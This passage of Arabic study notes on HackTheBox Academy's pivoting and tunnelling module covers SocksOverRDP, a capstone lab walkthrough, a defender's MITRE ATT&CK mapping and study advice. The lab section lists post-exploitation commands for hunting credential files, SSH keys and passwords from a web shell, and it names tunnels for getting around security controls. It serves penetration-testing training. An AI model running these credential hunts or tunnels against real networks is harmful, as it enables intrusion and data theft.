+لكن تسمح بـ
+
+```text
+RDP
+```
+
+فإنت تستغل الـ RDP نفسه.
+
+---
+
+## Performance
+
+المقال ذكر نقطة مهمة جدًا.
+
+لو فاتح:
+
+- RDP Session
+    
+- SOCKS Tunnel
+    
+- نقل ملفات
+    
+- Browsing
+    
+
+الجلسة هتبقى بطيئة.
+
+---
+
+علشان كده.
+
+افتح:
+
+```text
+mstsc
+
+↓
+
+Experience
+```
+
+واختار:
+
+```text
+Modem (56 kbps)
+```
+
+---
+
+## ليه؟
+
+هيقفل Features ملهاش لازمة.
+
+زي:
+
+- Desktop Background
+    
+- Animation
+    
+- Font Smoothing
+    
+- Aero
+    
+- Themes
+    
+
+فيبقى الـ Bandwidth كله للترافيك اللي إنت عايزه.
+
+---
+
+## مقارنة بين SocksOverRDP و SSH -D
+
+|SSH Dynamic Port Forward|SocksOverRDP|
+|---|---|
+|يعتمد على SSH|يعتمد على RDP|
+|يحتاج SSH Server|يحتاج RDP فقط|
+|بيعمل SOCKS Proxy|بيعمل SOCKS Proxy|
+|يشتغل على Linux وWindows|مخصص لويندوز|
+|مناسب لو SSH متاح|مناسب لو RDP هو المنفذ الوحيد|
+
+---
+
+## ملخص سريع
+
+```text
+لدينا RDP فقط
+        │
+        ▼
+نسجل SocksOverRDP Plugin
+        │
+        ▼
+نشغل SocksOverRDP Server
+        │
+        ▼
+يتفتح SOCKS Proxy على 127.0.0.1:1080
+        │
+        ▼
+نستخدم Proxifier
+        │
+        ▼
+أي برنامج (mstsc / Chrome / PowerShell ...)
+        │
+        ▼
+يعدي داخل الـ RDP
+        │
+        ▼
+يوصل لأي جهاز داخل الشبكة الداخلية
+```
+
+**الخلاصة:**  
+**SocksOverRDP = تحويل جلسة الـ RDP نفسها إلى SOCKS5 Tunnel**، وده بيسمحلك تعمل **Pivot** داخل شبكة Windows حتى لو SSH أو أدوات الـ Tunneling التانية مش متاحة.
+
+----
+# Layer 16
+ده يعتبر **الـ Capstone Lab** بتاع Module الـ **Pivoting, Tunneling & Port Forwarding** في HTB Academy.
+
+المطلوب هنا مش تحفظ أوامر، المطلوب إنك تعرف **تختار الأداة المناسبة لكل Hop**.
+
+---
+
+## الفكرة العامة
+
+هيكون عندك Web Shell على أول جهاز.
+
+يعني البداية هتبقى كده:
+
+```text
+             Internet
+                 │
+                 │
+        support.inlanefreight.local
+                 │
+        Web Shell (Foothold)
+                 │
+      ─────────────────────
+                 │
+        Internal Network #1
+                 │
+        Pivot Host
+                 │
+      ─────────────────────
+                 │
+        Internal Network #2
+                 │
+          Domain Controller
+```
+
+كل مرة هتدخل شبكة جديدة.
+
+هتلاقي Host جديد.
+
+منه تدخل على شبكة أعمق.
+
+لحد الـ DC.
+
+---
+
+## المطلوب منك
+
+المقال كاتب 4 أهداف.
+
+---
+
+## الهدف الأول
+
+> Start from external and access the first system via the web shell.
+
+يعني أول حاجة تستخدم الـ Web Shell.
+
+أول حاجة بعملها بعد ما أدخل؟
+
+### أعرف أنا مين
+
+```bash
+whoami
+```
+
+---
+
+### أعرف الصلاحيات
+
+```bash
+id
+```
+
+---
+
+### أعرف اسم الجهاز
+
+```bash
+hostname
+```
+
+---
+
+### أعرف النظام
+
+```bash
+uname -a
+```
+
+---
+
+### أعرف الشبكات
+
+```bash
+ip a
+```
+
+أو
+
+```bash
+ifconfig
+```
+
+---
+
+### أعرف الـ Routes
+
+```bash
+ip route
+```
+
+---
+
+### أعرف الخدمات المفتوحة
+
+```bash
+ss -tunlp
+```
+
+أو
+
+```bash
+netstat -tunlp
+```
+
+---
+
+### أعرف الـ Users
+
+```bash
+cat /etc/passwd
+```
+
+---
+
+### أعرف الـ History
+
+```bash
+history
+```
+
+---
+
+### أعرف الـ SSH Keys
+
+```bash
+find / -name id_rsa 2>/dev/null
+```
+
+---
+
+### أعرف الـ Passwords
+
+```bash
+grep -Ri password /var/www 2>/dev/null
+```
+
+---
+
+### ملفات الكونفيج
+
+```bash
+.env
+
+config.php
+
+database.php
+
+wp-config.php
+```
+
+---
+
+## الهدف الثاني
+
+> Use the web shell access to enumerate and pivot to an internal host.
+
+يعني:
+
+الجهاز ده غالبًا عنده Interface تانية.
+
+مثلاً:
+
+```text
+eth0
+
+10.129.x.x
+```
+
+و
+
+```text
+eth1
+
+172.16.5.x
+```
+
+يبقى Dual Homed.
+
+وده Pivot Host.
+
+---
+
+دلوقتي تبدأ تعمل Enumeration للشبكة الداخلية.
+
+مثلاً:
+
+```bash
+ping
+```
+
+أو
+
+```bash
+nmap
+```
+
+لو موجود.
+
+---
+
+أو
+
+```bash
+for i in {1..254}
+do
+ping -c1 172.16.5.$i
+done
+```
+
+---
+
+بعدها تشوف
+
+مين فاتح:
+
+```text
+22
+
+80
+
+445
+
+3389
+
+5985
+```
+
+---
+
+## الهدف الثالث
+
+> Continue enumeration until DC.
+
+يعني كل جهاز تدخله.
+
+كرر نفس الخطوات.
+
+```text
+Whoami
+
+IPs
+
+Routes
+
+Credentials
+
+SSH Keys
+
+Configs
+
+History
+
+Saved Passwords
+
+Interesting Files
+```
+
+---
+
+## الهدف الرابع
+
+> Grab all flags.
+
+أي Flag تلاقيها خدها.
+
+غالبًا هتكون:
+
+```text
+user.txt
+
+flag.txt
+
+proof.txt
+```
+
+أو
+
+```text
+HTB{...}
+```
+
+---
+
+## أهم جملة في اللاب
+
+> Use any data, credentials, scripts, or other information.
+
+دي أهم Hint.
+
+يعني متتوقعش إن كل Hop هيبقى باستخدام نفس الأداة.
+
+ممكن تلاقي:
+
+---
+
+SSH Key
+
+```text
+id_rsa
+```
+
+---
+
+Password
+
+```text
+password123
+```
+
+---
+
+VPN Config
+
+---
+
+Chisel
+
+---
+
+Socat
+
+---
+
+Netsh Rule
+
+---
+
+plink.exe
+
+---
+
+RDP Credentials
+
+---
+
+Saved Browser Passwords
+
+---
+
+Cron Job
+
+---
+
+Backup Script
+
+---
+
+يعني أي معلومة ممكن تبقى Pivot.
+
+---
+
+## إيه الأدوات اللي ممكن تحتاجها؟
+
+الموديول كله كان بيشرح أدوات.
+
+في اللاب ممكن تحتاج أي واحدة منهم.
+
+مثلاً
+
+---
+
+## SSH
+
+```bash
+ssh
+```
+
+---
+
+## Local Forward
+
+```bash
+ssh -L
+```
+
+---
+
+## Remote Forward
+
+```bash
+ssh -R
+```
+
+---
+
+## SOCKS
+
+```bash
+ssh -D
+```
+
+---
+
+## Chisel
+
+لو محتاج SOCKS.
+
+---
+
+## Socat
+
+لو محتاج Redirect.
+
+---
+
+## Proxychains
+
+مع
+
+```text
+nmap
+
+xfreerdp
+
+evil-winrm
+
+crackmapexec
+```
+
+---
+
+## Sshuttle
+
+لو عايز Routing كامل.
+
+---
+
+## Netsh
+
+لو Pivot Windows.
+
+---
+
+## SocksOverRDP
+
+لو عندك RDP بس.
+
+---
+
+## ptunnel-ng
+
+لو مفيش غير Ping.
+
+---
+
+## dnscat2
+
+لو DNS بس.
+
+---
+
+## أنا شخصيًا هبدأ اللاب إزاي؟
+
+أول 10 دقائق كلها Enumeration.
+
+مثلاً:
+
+```bash
+whoami
+
+id
+
+hostname
+
+pwd
+
+ls -la
+
+ip a
+
+ip route
+
+ss -tunlp
+
+env
+
+history
+
+sudo -l
+
+find / -perm -4000
+
+find / -name *.pem
+
+find / -name id_rsa
+
+find / -name *.kdbx
+
+find / -name *.conf
+
+find / -name *.env
+
+grep -Ri password /
+
+cat ~/.ssh/known_hosts
+
+cat ~/.bash_history
+```
+
+---
+
+بعدها أرسم الشبكة.
+
+مثلاً
+
+```text
+Internet
+
+↓
+
+Web Server
+
+10.129.20.15
+
+↓
+
+172.16.5.20
+
+↓
+
+Windows
+
+↓
+
+172.16.6.15
+
+↓
+
+DC
+```
+
+---
+
+كل مرة تكتشف Host جديد.
+
+ضيفه.
+
+---
+
+## أهم نصيحة
+
+**متستعجلش تستخدم Chisel أو Socat أو SSH Tunnel أول ما تدخل.**
+
+ابدأ دائمًا بـ **Enumeration**:
+
+1. اعرف الشبكات (`ip a`, `ip route`).
+    
+2. اعرف الخدمات (`ss`, `netstat`).
+    
+3. دور على Credentials وSSH Keys وملفات الإعداد.
+    
+4. بعد ما تفهم التوبولوجي، اختار أنسب وسيلة Pivot.
+    
+
+في لابات الـ HTB Skills Assessment، الحل غالبًا بيعتمد على **فهم البيئة** أكتر من حفظ أوامر الأدوات.
+
+
+# Layer 17
+الجزء ده مختلف عن كل اللي قبله، لأنه بيتكلم من منظور **Blue Team / Defender** مش Pentester. يعني بعد ما اتعلمت تعمل Pivoting وTunneling، بيقولك إزاي تمنعها أو تكتشفها.
+
+هشرحه جزء جزء.
+
+---
+
+## 1) Setting a Baseline
+
+أول حاجة لازم تعرف الطبيعي بتاع الشبكة.
+
+يعني إيه؟
+
+لو عندك شركة فيها:
+
+- 500 جهاز
+    
+- 20 سيرفر
+    
+- 100 برنامج
+    
+- 5 دومين كنترولر
+    
+
+لازم تكون عارفهم كلهم.
+
+لأن لو ظهر جهاز جديد أو Service جديدة هتعرف إنه شيء مش طبيعي.
+
+لازم توثق:
+
+- DNS Records
+    
+- DHCP
+    
+- كل الأجهزة
+    
+- كل البرامج
+    
+- Admin Accounts
+    
+- Dual-homed Hosts
+    
+- Network Diagram
+    
+
+وده بيسهل اكتشاف أي Pivot أو Tunnel جديد.
+
+---
+
+## 2) People
+
+أضعف نقطة في أي شركة هي الإنسان.
+
+مثال:
+
+Nick موظف بيستخدم لابتوبه الشخصي.
+
+نزل لعبة من Torrent.
+
+اللعبة فيها Malware.
+
+راح الشركة ووصل اللابتوب على WiFi.
+
+المهاجم دخل معاه جوه الشركة.
+
+يبقى الشركة كلها اتفتحت بسبب موظف واحد.
+
+الحل:
+
+- تدريب الموظفين
+    
+- MFA
+    
+- Awareness
+    
+- Incident Response Plan
+    
+
+---
+
+## 3) Processes
+
+يعني الشركة يبقى عندها سياسات.
+
+مثلاً:
+
+لو موظف ساب الشركة.
+
+هل الأكونت بيتقفل؟
+
+ولا يفضل شغال؟
+
+لو Server جديد اتعمل
+
+هل فيه Hardening؟
+
+هل فيه Documentation؟
+
+هل فيه Change Management؟
+
+كل دي Policies.
+
+---
+
+## 4) Technology
+
+هنا بقى الأدوات نفسها.
+
+يعني
+
+- Firewalls
+    
+- IDS
+    
+- IPS
+    
+- SIEM
+    
+- Patch Management
+    
+
+كلها تساعد تمنع الهجوم أو تكتشفه.
+
+---
+
+## 5) Perimeter Security
+
+أول حاجة تحميها هي الإنترنت.
+
+اسأل نفسك:
+
+إيه السيرفرات Public؟
+
+مين يقدر يدخل VPN؟
+
+مين يراقب Alerts؟
+
+هل فيه Disaster Recovery؟
+
+هل فيه OOB Management؟
+
+كل دي أسئلة لازم تتجاوب.
+
+---
+
+## 6) Internal Network
+
+بعد كده بص جوه الشبكة.
+
+هل:
+
+- فيه DMZ؟
+    
+- فيه IDS؟
+    
+- فيه IPS؟
+    
+- فيه Network Segmentation؟
+    
+- HR يقدر يدخل على Router؟
+    
+
+لو HR يقدر يوصل للـ Switch
+
+دي مصيبة.
+
+لازم كل قسم يكون معزول.
+
+وكمان تجمع Logs في SIEM.
+
+---
+
+## 7) MITRE ATT&CK Mapping
+
+دي أهم حتة.
+
+الجدول ده بيربط كل تقنية اتعلمتها في الموديول بطريقة الدفاع ضدها.
+
+---
+
+## External Remote Services (T1133)
+
+زي:
+
+- VPN
+    
+- SSH
+    
+- RDP
+    
+
+الحماية:
+
+- Firewall
+    
+- VPN
+    
+- عدم فتح الخدمات للعالم كله
+    
+
+---
+
+## Remote Services (T1021)
+
+زي:
+
+SSH
+
+RDP
+
+WinRM
+
+الحماية:
+
+- MFA
+    
+- Firewall Rules
+    
+- Least Privilege
+    
+- OOB Management
+    
+
+---
+
+## Non-Standard Ports (T1571)
+
+مثلاً
+
+HTTPS
+
+المفروض
+
+```
+443
+```
+
+لكن Malware يستخدم
+
+```
+4444
+8443
+5555
+```
+
+وده يخلي الـ IDS يشك.
+
+---
+
+## Protocol Tunneling (T1572)
+
+وده اللي الموديول كله كان بيتكلم عنه.
+
+زي:
+
+- SSH Tunnel
+    
+- Chisel
+    
+- DNSCat2
+    
+- ICMP Tunnel
+    
+- Rpivot
+    
+
+كلهم بيخفوا الترافيك.
+
+الحماية:
+
+- منع DNS الخارجي
+    
+- السماح للـ DNS Server فقط
+    
+- IDS
+    
+- مراقبة Beaconing
+    
+- منع البروتوكولات غير المطلوبة
+    
+
+---
+
+## Proxy Use (T1090)
+
+زي:
+
+- SOCKS
+    
+- Proxychains
+    
+- Chisel
+    
+- SOCKS5
+    
+
+الحماية:
+
+- Whitelist للـ IPs
+    
+- مراقبة الـ NetFlow
+    
+- منع الاتصالات غير المصرح بها
+    
+
+---
+
+## LOTL (Living Off The Land)
+
+وده أخطر نوع.
+
+يعني المهاجم يستخدم أدوات ويندوز نفسها.
+
+مثلاً:
+
+```
+netsh
+
+powershell
+
+certutil
+
+regsvr32
+
+bitsadmin
+```
+
+بدل ما ينزل Malware.
+
+الحماية:
+
+- EDR
+    
+- AV
+    
+- SIEM
+    
+- مراقبة الـ Command Lines
+    
+- Behavioral Detection
+    
+
+---
+
+## ملخص الموديول كله
+
+الموديول كان بيعلمك إزاي تعمل **Pivoting وTunneling** للوصول إلى شبكات داخلية باستخدام تقنيات مختلفة، مثل:
+
+- SSH Port Forwarding
+    
+- SSH Dynamic Port Forwarding (SOCKS)
+    
+- Socat
+    
+- Chisel
+    
+- Sshuttle
+    
+- Rpivot
+    
+- Netsh Port Proxy
+    
+- DNSCat2
+    
+- Ptunnel (ICMP)
+    
+- SocksOverRDP
+    
+
+وفي النهاية بيشرح من منظور المدافع إزاي يكتشف أو يمنع كل تقنية من دول عن طريق:
+
+- Network Segmentation
+    
+- Firewalls
+    
+- IDS / IPS
+    
+- SIEM
+    
+- MFA
+    
+- Baseline Monitoring
+    
+- Least Privilege
+    
+- Logging
+    
+- EDR
+    
+- DNS Control
+    
+- Network Traffic Analysis
+    
+
+وده بيخليك كـ Pentester لما تكتب التقرير النهائي، تقدر توضح **الثغرة + طريقة الاستغلال + التوصيات العملية لمنعها** بدل ما تكتفي بإثبات الاستغلال فقط.
+
+# Layer 18
+الجزء ده هو **الخاتمة (Conclusion)** للموديول، وبيشرح ليه كل اللي اتعلمته مهم في الشغل الحقيقي، وإيه الخطوة اللي بعدها.
+
+---
+
+## أولًا: Real World
+
+HTB بيقولك إن كل اللي اتعلمته في الموديول ده مش مجرد لابات.
+
+دي حاجات بتحصل يوميًا في أي Pentest داخل شركة.
+
+يعني ممكن تكون داخل شركة، ومعاك Initial Access على جهاز واحد.
+
+مدير التيم يقولك:
+
+> "عايزك توصل للدومين كنترولر."
+
+وده مستحيل تعمله من غير Pivoting.
+
+---
+
+## مثال حقيقي
+
+أنت دخلت Web Server في الـ DMZ.
+
+```
+Internet
+    │
+    ▼
+Web Server
+```
+
+لكن الدومين كنترولر موجود هنا
+
+```
+Internal LAN
+      │
+      ▼
+Domain Controller
+```
+
+مينفعش توصله مباشرة.
+
+فتبدأ تعمل:
+
+```
+Web Shell
+      │
+      ▼
+SSH Tunnel
+      │
+      ▼
+SOCKS Proxy
+      │
+      ▼
+RDP
+      │
+      ▼
+DC
+```
+
+وده بالظبط اللي اتعلمته.
+
+---
+
+## الحاجات اللي هتعملها كتير كشخص Pentester
+
+## 1- استخدام الـ Pivot
+
+يعني بعد ما تعمل Tunnel
+
+زميلك في الفريق ييجي يستخدمه.
+
+مثلاً
+
+أنت عملت Chisel.
+
+هو يشغل
+
+```
+proxychains crackmapexec
+```
+
+أو
+
+```
+proxychains nmap
+```
+
+على نفس الـ Tunnel.
+
+---
+
+## 2- Persistence
+
+يعني بعد ما تدخل Subnet
+
+تسيب وسيلة ترجع بيها بعدين.
+
+مثلاً
+
+- Scheduled Task
+    
+- SSH Key
+    
+- Service
+    
+- Agent
+    
+
+علشان لو الجهاز وقع
+
+يبقى لسه معاك Access.
+
+---
+
+## 3- Command & Control
+
+بدل Reverse Shell واحد
+
+يبقى عندك
+
+```
+C2 Server
+      │
+      ▼
+Pivot
+      │
+      ▼
+Windows
+      │
+      ▼
+Domain Controller
+```
+
+زي
+
+- Sliver
+    
+- Mythic
+    
+- Havoc
+    
+- Cobalt Strike
+    
+
+كلها بتستخدم Pivoting.
+
+---
+
+## 4- Bypass Security
+
+مثلاً الشركة مانعة
+
+```
+wget
+```
+
+أو
+
+```
+curl
+```
+
+أو HTTPS.
+
+فتستخدم
+
+- DNS Tunnel
+    
+- ICMP Tunnel
+    
+- SSH Tunnel
+    
+
+علشان تدخل Tool أو تطلع ملفات.
+
+وده اسمه
+
+```
+Security Control Bypass
+```
+
+---
+
+## Networking مهم جدًا
+
+HTB بيقول:
+
+لو حسيت إن الموديول صعب
+
+ارجع ذاكر Networking.
+
+لأن Pivoting كله مبني على
+
+- Routing
+    
+- Subnets
+    
+- TCP
+    
+- UDP
+    
+- SSH
+    
+- SOCKS
+    
+- Layer 2
+    
+- Layer 3
+    
+
+لو فاهمهم
+
+الموديول هيبقى سهل جدًا.
+
+---
+
+## بعد الموديول ده أذاكر إيه؟
+
+HTB مرشحلك الترتيب ده.
+
+---
+
+## 1) Introduction to Active Directory ⭐⭐⭐⭐⭐
+
+لازم جدًا.
+
+عشان أغلب الشركات Windows.
+
+هتتعلم
+
+- Domain
+    
+- Forest
+    
+- Trust
+    
+- Users
+    
+- Groups
+    
+
+---
+
+## 2) AD Enumeration & Attacks ⭐⭐⭐⭐⭐
+
+وده أهم موديول بعده.
+
+هتتعلم
+
+- BloodHound
+    
+- Kerberoasting
+    
+- AS-REP Roast
+    
+- DCSync
+    
+- ACL Abuse
+    
+
+---
+
+## 3) Shells & Payloads ⭐⭐⭐⭐
+
+هتفهم
+
+- Meterpreter
+    
+- msfvenom
+    
+- stageless
+    
+- staged
+    
+- Reverse Shell
+    
+- Bind Shell
+    
+
+---
+
+## 4) Web Applications
+
+لو حسيت إن Web Shell كان صعب.
+
+ارجع ذاكر
+
+- Upload
+    
+- RCE
+    
+- Web Shells
+    
+
+---
+
+## بعد HTB Academy
+
+بيقولك متقفش عند اللابات.
+
+ابدأ تحل Boxes.
+
+رشحلك
+
+---
+
+## Enterprise
+
+فيها Pivoting كتير.
+
+---
+
+## Inception
+
+فيها SSH Pivot.
+
+---
+
+## Reddish
+
+من أصعب البوكسات في الـ Pivoting.
+
+وده البوكس اللي IppSec شرحه.
+
+---
+
+## بعد كده
+
+لو عايز مستوى أعلى
+
+خش
+
+## Pro Labs
+
+ودي عبارة عن شركة كاملة.
+
+زي
+
+```
+Internet
+      │
+Firewall
+      │
+DMZ
+      │
+App Server
+      │
+SQL
+      │
+DC
+```
+
+لازم تعمل عشرات الـ Pivot علشان تخلصها.
+
+أشهرهم
+
+- Dante
+    
+- Offshore
+    
+- RastaLabs
+    
+
+---
+
+## Mini Pro Labs
+
+زي
+
+Ascension
+
+وده فيه
+
+```
+Two Domains
+```
+
+يعني
+
+Domain Trust
+
+Pivot
+
+Privilege Escalation
+
+Cross Domain
+
+كلهم مع بعض.
+
+---
+
+## مصادر ينصح بيها
+
+HTB بيقول متقفش عند الأكاديمية.
+
+اقرأ لناس زي
+
+## 0xdf
+
+من أفضل الناس في كتابة Walkthroughs.
+
+هيفهمك
+
+"ليه استخدم الأداة دي؟"
+
+مش
+
+"إزاي أشغلها؟"
+
+---
+
+## RastaMouse
+
+متخصص في
+
+- C2
+    
+- Payloads
+    
+- Pivoting
+    
+- Red Team
+    
+
+---
+
+## SpecterOps
+
+من أكبر الشركات في Red Team.
+
+هتلاقي مقالات قوية جدًا عن
+
+- AD
+    
+- Kerberos
+    
+- SSH Tunnels
+    
+- SOCKS
+    
+- Proxying
+    
+
+---
+
+## IppSec
+
+لو عايز تشوف Pentest كامل من أول نقطة دخول لحد الـ Domain Admin.
+
+---
+
+## الرسالة الأخيرة من HTB
+
+بيقولك إن:
+
+**Pivoting وTunneling وPort Forwarding مش Skills إضافية، دي من أساسيات أي Pentester.**
+
+لأن في الواقع، الوصول الأولي (Initial Access) غالبًا بيكون على جهاز واحد فقط، بينما الهدف الحقيقي بيكون في شبكة داخلية. النجاح في الاختبار بيعتمد على قدرتك توصل من الجهاز الأول إلى باقي البيئة باستخدام تقنيات الـ Pivoting المناسبة.
+
+---
+
+## خلاصة الموديول كله
+
+بعد إنهاء الموديول ده، المفروض تكون عرفت تستخدم معظم أشهر تقنيات الـ Pivoting الموجودة في الاختبارات الحقيقية، مثل:
+
+|التقنية|الاستخدام|
+|---|---|
+|SSH Local Port Forward|فتح منفذ محلي يصل إلى خدمة داخلية|
+|SSH Remote Port Forward|جعل خدمة داخلية متاحة خارج الشبكة|
+|SSH Dynamic Forward (SOCKS)|إنشاء SOCKS Proxy واستخدام Proxychains|
+|Socat|Port Forwarding وRelay للاتصالات|
+|Chisel|إنشاء أنفاق HTTP/SOCKS حتى مع القيود النارية|
+|Sshuttle|VPN خفيف يعتمد على SSH بدون Proxychains|
+|Rpivot|Reverse SOCKS Proxy|
+|Netsh Portproxy|Port Forwarding باستخدام أدوات ويندوز المدمجة|
+|Dnscat2|Tunnel عبر DNS عندما تكون القنوات الأخرى محجوبة|
+|Ptunnel-ng|Tunnel عبر ICMP (Ping)|
+|SocksOverRDP|إنشاء SOCKS Proxy داخل جلسة RDP|
+
+لو قدرت تطبق التقنيات دي في لابات مثل HTB Pro Labs أو بيئات Active Directory، هتكون اكتسبت واحدة من أهم المهارات المطلوبة في اختبارات الاختراق الداخلية (Internal Network Penetration Testing) والـ Red Teaming.
